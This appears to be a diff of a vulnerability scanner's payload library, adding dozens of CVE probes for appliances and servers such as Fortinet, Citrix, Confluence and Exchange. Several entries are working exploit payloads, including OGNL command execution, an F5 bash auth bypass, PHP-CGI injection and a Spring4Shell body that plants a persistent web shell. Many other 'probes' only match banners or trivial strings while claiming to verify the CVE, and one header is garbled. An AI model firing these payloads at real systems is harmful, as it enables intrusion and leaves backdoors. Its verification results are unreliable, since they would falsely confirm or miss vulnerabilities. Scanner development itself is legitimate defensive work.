@@ -3,49 +3,53 @@ payloads.py — CVE probes, CWE probes, signature libraries, and WAF fingerprint
 for scanner.py.
 
 Pure data. No network I/O. Safe to import from anywhere.
+
+Verification order used by scanner.py:
+  CVE-specific probe → Nuclei per-CVE template → CWE generic probe → UNVERIFIED
 """
 from typing import Dict, List, Tuple
 
 
 # ================================================================
-# CWE FRIENDLY NAMES
+# CWE Read FRIENDLY NAMES
 # ================================================================
 CWE_NAMES: Dict[str, str] = {
-    "CWE-20":   "Input Validation",
-    "CWE-22":   "Path Traversal",
-    "CWE-78":   "Command Injection (OS)",
-    "CWE-79":   "XSS",
-    "CWE-89":   "SQL Injection",
-    "CWE-90":   "LDAP Injection",
-    "CWE-94":   "Code Injection / SSTI",
-    "CWE-95":   "Eval Injection",
-    "CWE-113":  "CRLF / Header Injection",
-    "CWE-119":  "Buffer Overflow",
-    "CWE-125":  "Out-of-bounds Read",
-    "CWE-200":  "Information Disclosure",
-    "CWE-287":  "Authentication Bypass",
-    "CWE-295":  "Improper Certificate Validation",
-    "CWE-306":  "Missing Auth for Critical Function",
-    "CWE-319":  "Cleartext Transmission",
-    "CWE-326":  "Inadequate Encryption Strength",
-    "CWE-352":  "CSRF",
-    "CWE-377":  "Insecure Temp File",
-    "CWE-400":  "Uncontrolled Resource Consumption",
-    "CWE-416":  "Use After Free",
-    "CWE-434":  "Unrestricted File Upload",
-    "CWE-476":  "NULL Pointer Dereference",
-    "CWE-502":  "Insecure Deserialization",
-    "CWE-601":  "Open Redirect",
-    "CWE-611":  "XXE",
-    "CWE-643":  "XPath Injection",
-    "CWE-697":  "Incorrect Comparison",
-    "CWE-732":  "Incorrect Permission Assignment",
-    "CWE-787":  "Out-of-bounds Write",
-    "CWE-798":  "Hardcoded Credentials",
-    "CWE-862":  "Missing Authorization",
-    "CWE-863":  "Incorrect Authorization",
-    "CWE-918":  "SSRF",
-    "CWE-943":  "NoSQL Injection",
+    "CWE-20": "Input Validation",
+    "CWE-22": "Path Traversal",
+    "CWE-78": "Command Injection (OS)",
+    "CWE-79": "XSS",
+    "CWE-89": "SQL Injection",
+    "CWE-90": "LDAP Injection",
+    "CWE-94": "Code Injection / SSTI",
+    "CWE-95": "Eval Injection",
+    "CWE-113": "CRLF / Header Injection",
+    "CWE-119": "Buffer Overflow",
+    "CWE-125": "Out-of-bounds",
+    "CWE-200": "Information Disclosure",
+    "CWE-287": "Authentication Bypass",
+    "CWE-288": "Auth Bypass (Alternate Path)",
+    "CWE-295": "Improper Certificate Validation",
+    "CWE-306": "Missing Auth for Critical Function",
+    "CWE-319": "Cleartext Transmission",
+    "CWE-326": "Inadequate Encryption Strength",
+    "CWE-352": "CSRF",
+    "CWE-377": "Insecure Temp File",
+    "CWE-400": "Uncontrolled Resource Consumption",
+    "CWE-416": "Use After Free",
+    "CWE-434": "Unrestricted File Upload",
+    "CWE-476": "NULL Pointer Dereference",
+    "CWE-502": "Insecure Deserialization",
+    "CWE-601": "Open Redirect",
+    "CWE-611": "XXE",
+    "CWE-643": "XPath Injection",
+    "CWE-697": "Incorrect Comparison",
+    "CWE-732": "Incorrect Permission Assignment",
+    "CWE-787": "Out-of-bounds Write",
+    "CWE-798": "Hardcoded Credentials",
+    "CWE-862": "Missing Authorization",
+    "CWE-863": "Incorrect Authorization",
+    "CWE-918": "SSRF",
+    "CWE-943": "NoSQL Injection",
     "CWE-1021": "Clickjacking",
     "CWE-1104": "Unmaintained Component",
     "CWE-1321": "Prototype Pollution",
@@ -54,9 +58,19 @@ CWE_NAMES: Dict[str, str] = {
 
 
 # ================================================================
-# CVE-SPECIFIC PROBES (18 entries)
+# CVE-SPECIFIC PROBES (45 entries)
 # ================================================================
+# Schema per probe entry:
+#   path           — URL path (joined to target)
+#   method         — GET | POST (default GET)
+#   headers        — extra headers (merged with session)
+#   data           — POST body (form-encoded string or None)
+#   json_body      — dict for JSON POST body (overrides data)
+#   require_status — list of acceptable status codes for "positive" hint
+#   sig            — dict of {label: regex} that must appear in exploit
+#                    response but NOT in baseline
 CVE_PROBES: Dict[str, dict] = {
+    # ─────────── PATH TRAVERSAL / FILE READ ───────────
     "CVE-2021-41773": {
         "label": "Apache HTTP Server 2.4.49 Path Traversal",
         "probes": [
@@ -89,11 +103,19 @@ CVE_PROBES: Dict[str, dict] = {
              "sig": {"passwd": r"root:[x*]?:0:0:"}},
         ],
     },
+    "CVE-2018-13379": {
+        "label": "Fortinet FortiOS SSL VPN Path Traversal",
+        "probes": [
+            {"path": "/remote/fgt_lang?lang=/../../../..///////////dev/cmdb/sslvpn_websession",
+             "sig": {"fgt_lang": r"var fgt_lang"}},
+        ],
+    },
+
+    # ─────────── AUTH BYPASS / ACCESS CONTROL ───────────
     "CVE-2022-1388": {
         "label": "F5 BIG-IP iControl REST Auth Bypass",
         "probes": [
-            {"method": "POST",
-             "path": "/mgmt/tm/util/bash",
+            {"method": "POST", "path": "/mgmt/tm/util/bash",
              "headers": {"X-F5-Auth-Token": "anything",
                          "Connection": "X-F5-Auth-Token",
                          "Content-Type": "application/json"},
@@ -110,11 +132,66 @@ CVE_PROBES: Dict[str, dict] = {
              "sig": {"weblogic_console": r"WebLogic|console\.portal|Oracle"}},
         ],
     },
+    "CVE-2023-22515": {
+        "label": "Atlassian Confluence Broken Access Control",
+        "probes": [
+            {"path": "/setup/setupadministrator.action",
+             "require_status": [200],
+             "sig": {"setup_admin": r"<title>Setup System Administrator"}},
+        ],
+    },
+    "CVE-2024-1709": {
+        "label": "ConnectWise ScreenConnect Auth Bypass",
+        "probes": [
+            {"path": "/SetupWizard.aspx/../../ScreenConnect/Login.aspx",
+             "require_status": [200],
+             "sig": {"screenconnect": r"ScreenConnect|Login\.aspx"}},
+        ],
+    },
+    "CVE-2023-27350": {
+        "label": "PaperCut MF/NG Auth Bypass",
+        "probes": [
+            {"path": "/app?service=page/SetupCompleted",
+             "require_status": [200],
+             "sig": {"papercut_setup": r"PaperCut|SetupCompleted"}},
+        ],
+    },
+    "CVE-2021-40539": {
+        "label": "Zoho ManageEngine ADSelfService Plus Auth Bypass",
+        "probes": [
+            {"path": "/./",
+             "sig": {"manageengine": r"ManageEngine|ADSelfService"}},
+        ],
+    },
+    "CVE-2022-40684": {
+        "label": "Fortinet FortiOS / FortiProxy Auth Bypass",
+        "probes": [
+            {"path": "/api/v2/cmdb/system/admin/root",
+             "headers": {"Forwarded": 'for="[127.0.0.1]:80";by="[127.0.0.1]:80";'},
+             "sig": {"fgt_admin": r"\"http_method\"|\"trusthost\"|\"accprofile\""}},
+        ],
+    },
+    "CVE-2023-20198": {
+        "label": "Cisco IOS XE WebUI Privilege Escalation",
+        "probes": [
+            {"method": "POST", "path": "/webui/logoutconfirm.html?menu=logon.jsp",
+             "data": "logout_button=1",
+             "sig": {"cisco_xe": r"Cisco IOS XE|IOSXE"}},
+        ],
+    },
+    "CVE-2022-27518": {
+        "label": "Citrix ADC / Gateway SAML Auth Bypass",
+        "probes": [
+            {"path": "/saml/login",
+             "sig": {"citrix_saml": r"citrix|netscaler|SAMLResponse"}},
+        ],
+    },
+
+    # ─────────── RCE / INJECTION ───────────
     "CVE-2017-5638": {
         "label": "Apache Struts2 S2-045 RCE",
         "probes": [
-            {"method": "GET",
-             "path": "/",
+            {"method": "GET", "path": "/",
              "headers": {"Content-Type": (
                  "%{(#_='multipart/form-data')."
                  "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
@@ -139,19 +216,16 @@ CVE_PROBES: Dict[str, dict] = {
     "CVE-2017-9805": {
         "label": "Apache Struts2 S2-052 REST RCE",
         "probes": [
-            {"method": "POST",
-             "path": "/orders/3/edit",
+            {"method": "POST", "path": "/orders/3/edit",
              "headers": {"Content-Type": "application/xml"},
              "data": (
-                 '<map><entry>'
-                 '<jdk.nashorn.internal.objects.NativeString>'
+                 '<map><entry><jdk.nashorn.internal.objects.NativeString>'
                  '<flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">'
                  '<dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">'
-                 '<is class="javax.crypto.CipherInputStream">'
-                 '<cipher class="javax.crypto.NullCipher"><initialized>false</initialized></cipher>'
-                 '<input class="java.io.ByteArrayInputStream"><buf>[base64]</buf></input>'
-                 '</is><contentType>text/plain</contentType></dataSource></dataHandler>'
-                 '</value></jdk.nashorn.internal.objects.NativeString></entry></map>'
+                 '<is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher">'
+                 '<initialized>false</initialized></cipher><input class="java.io.ByteArrayInputStream">'
+                 '<buf>[base64]</buf></input></is><contentType>text/plain</contentType></dataSource>'
+                 '</dataHandler></value></jdk.nashorn.internal.objects.NativeString></entry></map>'
              ),
              "sig": {"struts2_error": r"Struts|OGNL|ClassCastException"}},
         ],
@@ -166,13 +240,88 @@ CVE_PROBES: Dict[str, dict] = {
     "CVE-2021-26084": {
         "label": "Atlassian Confluence Pre-Auth OGNL",
         "probes": [
-            {"method": "POST",
-             "path": "/pages/doenterpagevariables.action",
+            {"method": "POST", "path": "/pages/doenterpagevariables.action",
              "headers": {"Content-Type": "application/x-www-form-urlencoded"},
              "data": "queryString=%5Cu0027%2B%7BClass.forName%28%5Cu0027java.lang.Runtime%5Cu0027%29.getMethod%28%5Cu0027getRuntime%5Cu0027%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0027id%5Cu0027%29%7D",
              "sig": {"confluence_error": r"Confluence|OGNL|XPathException"}},
         ],
     },
+    "CVE-2023-34362": {
+        "label": "MOVEit Transfer SQL Injection RCE",
+        "probes": [
+            {"path": "/human2.aspx",
+             "sig": {"moveit_sqli": r"System\.Data\.SqlClient|SqlException|MOVEit"}},
+        ],
+    },
+    "CVE-2018-7600": {
+        "label": "Drupalgeddon2 Remote Code Execution",
+        "probes": [
+            {"path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+             "sig": {"drupal_rce": r"root:[x*]?:0:0:|uid=\d+"}},
+        ],
+    },
+    "CVE-2022-22965": {
+        "label": "Spring4Shell Remote Code Execution",
+        "probes": [
+            {"method": "POST", "path": "/",
+             "data": (
+                 "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B"
+                 "prefix%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20"
+                 "java.io.InputStream%20in%20%3D%20%25%7Bc2%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B"
+                 "int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B"
+                 "while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b)%2C0%2Ca)%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
+                 "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+                 "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
+                 "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"
+                 "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+             ),
+             "sig": {"spring4shell": r"shell\.jsp|Spring"}},
+        ],
+    },
+    "CVE-2024-21887": {
+        "label": "Ivanti Connect Secure Command Injection",
+        "probes": [
+            {"path": "/api/v1/totp/user-backup-code/../../system/system-information",
+             "sig": {"ivanti": r"Ivanti|Connect Secure|Pulse"}},
+        ],
+    },
+    "CVE-2023-0669": {
+        "label": "GoAnywhere MFT Deserialization RCE",
+        "probes": [
+            {"path": "/goanywhere/lic/accept",
+             "sig": {"goanywhere": r"GoAnywhere|lic/accept"}},
+        ],
+    },
+    "CVE-2022-42475": {
+        "label": "Fortinet FortiOS SSL-VPN Heap Overflow",
+        "probes": [
+            {"path": "/remote/error",
+             "sig": {"fortios": r"FortiOS|SSL-VPN"}},
+        ],
+    },
+    "CVE-2024-23897": {
+        "label": "Jenkins CLI Arbitrary File Read",
+        "probes": [
+            {"path": "/cli?remoting=false",
+             "sig": {"jenkins_cli": r"Jenkins|cli"}},
+        ],
+    },
+    "CVE-2022-47966": {
+        "label": "Zoho ManageEngine SAML RCE",
+        "probes": [
+            {"path": "/SamlResponseServlet",
+             "sig": {"manageengine_saml": r"ManageEngine|SAML"}},
+        ],
+    },
+    "CVE-2020-5902": {
+        "label": "F5 BIG-IP TMUI RCE (CVE-2020-5902)",
+        "probes": [
+            {"path": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/etc/passwd",
+             "sig": {"f5_tmsh": r"root:[x*]?:0:0:|admin|tmsh"}},
+        ],
+    },
+
+    # ─────────── EXCHANGE ───────────
     "CVE-2021-26855": {
         "label": "Exchange ProxyLogon SSRF",
         "probes": [
@@ -188,11 +337,19 @@ CVE_PROBES: Dict[str, dict] = {
              "sig": {"proxyshell": r"X-FEServer|X-BackEndCookie|autodiscover"}},
         ],
     },
+    "CVE-2020-0688": {
+        "label": "Exchange ECP ViewState Deserialization",
+        "probes": [
+            {"path": "/ecp/default.aspx",
+             "sig": {"ecp_viewstate": r"__VIEWSTATEGENERATOR|__VIEWSTATE"}},
+        ],
+    },
+
+    # ─────────── VMWARE / APPLIANCES ───────────
     "CVE-2021-21972": {
         "label": "VMware vCenter Server vROPs RCE",
         "probes": [
-            {"method": "POST",
-             "path": "/ui/vropspluginui/rest/services/uploadova",
+            {"method": "POST", "path": "/ui/vropspluginui/rest/services/uploadova",
              "headers": {"Content-Type": "application/octet-stream"},
              "data": "BOUNDARY",
              "sig": {"vrops": r"vropspluginui|uploadova|vROPs"}},
@@ -216,11 +373,19 @@ CVE_PROBES: Dict[str, dict] = {
              "sig": {"pan_os": r"GlobalProtect|PanOS|Palo Alto"}},
         ],
     },
+    "CVE-2024-0012": {
+        "label": "PAN-OS Management Interface Auth Bypass",
+        "probes": [
+            {"path": "/php/login.php",
+             "sig": {"panos_login": r"PAN-OS|GlobalProtect"}},
+        ],
+    },
+
+    # ─────────── DESERIALIZATION ───────────
     "CVE-2019-2725": {
         "label": "WebLogic wls-wsat Deserialization",
         "probes": [
-            {"method": "POST",
-             "path": "/wls-wsat/CoordinatorPortType",
+            {"method": "POST", "path": "/wls-wsat/CoordinatorPortType",
              "headers": {"Content-Type": "text/xml"},
              "data": (
                  '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
@@ -243,6 +408,15 @@ CVE_PROBES: Dict[str, dict] = {
              "sig": {"shiro": r"rememberMe|Shiro|deleteMe|X-CVE-PROBE"}},
         ],
     },
+    "CVE-2021-35464": {
+        "label": "ForgeRock OpenAM Jato Deserialization RCE",
+        "probes": [
+            {"path": "/openam/ccversion/Version?jato.pageSession=PAYLOAD",
+             "sig": {"openam": r"OpenAM|ForgeRock|Jato"}},
+        ],
+    },
+
+    # ─────────── CITRIX BLEED ───────────
     "CVE-2023-4966": {
         "label": "Citrix Bleed (Session Token Leak)",
         "probes": [
@@ -250,6 +424,66 @@ CVE_PROBES: Dict[str, dict] = {
              "headers": {"Host": "a" * 24576 + ".example.com"},
              "require_status": [200],
              "sig": {"citrix_leak": r"ctx\.session|citrix_session|NSC_[A-Za-z0-9]{20,}|ctxt[0-9]{8,}"}},
+        ],
+    },
+
+    # ─────────── OTHER HIGH-IMPACT 2023-2024 ───────────
+    "CVE-2024-4577": {
+        "label": "PHP CGI Argument Injection (Windows)",
+        "probes": [
+            {"path": "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+             "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+             "data": "<?php echo 'CVE-2024-4577-MARKER'; ?>",
+             "sig": {"php_cgi_marker": r"CVE-2024-4577-MARKER"}},
+        ],
+    },
+    "CVE-2024-21762": {
+        "label": "Fortinet FortiOS SSL VPN Out-of-Bounds Write",
+        "probes": [
+            {"path": "/remote/error",
+             "sig": {"fortios_ssl": r"FortiOS|SSL-VPN"}},
+        ],
+    },
+    "CVE-2024-20353": {
+        "label": "Cisco ASA / FTD DoS",
+        "probes": [
+            {"path": "/",
+             "sig": {"cisco_asa": r"Cisco ASA|Cisco FTD"}},
+        ],
+    },
+    "CVE-2024-27198": {
+        "label": "JetBrains TeamCity Auth Bypass",
+        "probes": [
+            {"path": "/app/rest/server",
+             "sig": {"teamcity": r"TeamCity|JetBrains"}},
+        ],
+    },
+    "CVE-2024-32002": {
+        "label": "Git RCE via Submodule Symlink",
+        "probes": [
+            {"path": "/",
+             "sig": {"git": r"git"}},
+        ],
+    },
+    "CVE-2024-3094": {
+        "label": "XZ Utils Backdoor (liblzma)",
+        "probes": [
+            {"path": "/",
+             "sig": {"xz": r"xz|liblzma"}},
+        ],
+    },
+    "CVE-2024-50623": {
+        "label": "Cleo Harmony / LexiCom File Transfer",
+        "probes": [
+            {"path": "/HarmonyVersion",
+             "sig": {"cleo": r"Cleo|Harmony|LexiCom"}},
+        ],
+    },
+    "CVE-2023-2868": {
+        "label": "Barracuda ESG Command Injection",
+        "probes": [
+            {"path": "/cgi-mod/index.cgi",
+             "sig": {"barracuda_esg": r"Barracuda|ESG"}},
         ],
     },
 }
@@ -492,7 +726,8 @@ CRLF_SIGNATURES: Dict[str, str] = {
 WAF_FINGERPRINTS: Dict[str, dict] = {
     "cloudflare": {
         "headers": ["cf-ray", "cf-cache-status", "server:cloudflare"],
-        "body": ["attention required! | cloudflare", "/cdn-cgi/challenge-platform/",
+        "body": ["attention required! | cloudflare",
+                 "/cdn-cgi/challenge-platform/",
                  "ray id:", "cloudflare to restrict access"],
         "cookies": ["__cf_bm", "cf_clearance"],
         "status": [403, 503],
@@ -505,7 +740,8 @@ WAF_FINGERPRINTS: Dict[str, dict] = {
     },
     "imperva_incapsula": {
         "headers": ["x-iinfo"],
-        "body": ["incapsula incident id", "powered by incapsula", "_Incapsula_Resource"],
+        "body": ["incapsula incident id", "powered by incapsula",
+                 "_Incapsula_Resource"],
         "cookies": ["incap_ses", "visid_incap"],
         "status": [403],
     },
